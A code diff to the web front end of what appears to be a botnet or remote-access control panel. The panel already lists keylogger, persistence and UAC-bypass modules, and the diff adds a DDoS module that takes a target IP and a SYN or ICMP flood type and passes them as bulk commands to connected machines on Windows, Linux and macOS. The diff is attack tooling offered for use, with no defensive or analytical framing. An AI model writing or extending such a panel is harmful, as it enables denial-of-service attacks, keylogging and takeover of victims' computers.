@@ -39,6 +39,7 @@
 								<div class="form-group" align="left">
 									<select required class="selectboxit" data-first-option="false" id="module" name="module" style="overflow: visible;">
 										<option>Select module</option>
+										<option value="ddos">DDos</option>
 										<option value="persistence">Persistence</option>
 										<option value="keylogger">Keylogger</option>
 										<option value="escalate">Escalate Privileges</option>
@@ -110,6 +111,18 @@
 									<div class="input-group" name="portscanner" id="portscanner">
 
 									  	<input class="form-control" name="portscanner-ip" id="portscanner-ip" placeholder="Target IP" type="text" required></input>
+
+									</div>
+
+									<!-- DDoS Options -->
+									<div class="input-group" name="ddos" id="ddos">
+
+									  	<input class="form-control" name="ddos-target-ip" id="ddos-target-ip" placeholder="Target IP" type="text" required></input>
+
+									  	<select class="form-control" name="ddos-type" id="ddos-type" style="margin-top: 5px;">
+											<option value="syn">SYN Flood</option>
+											<option value="icmp">ICMP Flood</option>
+										</select>
 
 									</div>
 
@@ -705,7 +718,25 @@
 					<img src="/assets/images/os/win32.png" width="30" height="30" style="padding: 2px">`);
 				$('#module-description').html(`<p>Attempt UAC bypass to escalate privileges (Windows)</p>`);
 				$('#module-info').html('');	
-			} 
+			} else if (val === "ddos") {
+				$('#ddos-label').show();
+				$('#ddos').show();
+
+				// add module name/info
+				$('#module-name').html('DDoS');
+				$('#module-platforms').html(`
+					<strong>Platforms: </strong>
+					<img src="/assets/images/os/win32.png" width="30" height="30" style="padding: 2px">
+					<img src="/assets/images/os/linux2.png" width="30" height="30" style="padding: 2px">
+					<img src="/assets/images/os/darwin.png" width="30" height="30" style="padding: 2px">`);
+				$('#module-description').html(`<p>Perform Distributed Denial of Service (DDoS) attacks using SYN or ICMP flood techniques.</p>`);
+				$('#module-info').html(`
+					<li><strong>Target IP</strong> IP address of the target to attack</li>
+					<li><strong>Attack Type</strong> SYN Flood (port 80) or ICMP Flood</li>`);
+			} else {
+				$('#ddos-label').hide();
+				$('#ddos').hide();
+			}
 		}
 
 		function executeBulkAction() {
@@ -735,6 +766,11 @@
 				}
 				var process_name = $('#process-name').selectBoxIt().val();
 				params += ' ' + process_name;
+
+			} else if (action == 'ddos') {
+				var ddos_target_ip = $('#ddos-target-ip').val();
+				var ddos_type = $('#ddos-type').val();
+				params += ddos_target_ip + ' ' + ddos_type;
 
 			}
 
@@ -808,6 +844,10 @@
 			// hide process control options
 			$('#process-label').hide();
 			$('#process').hide();
+
+			// hide ddos options
+			$('#ddos-label').hide();
+			$('#ddos').hide();
 		});
 
 		$(document).ready(function(){
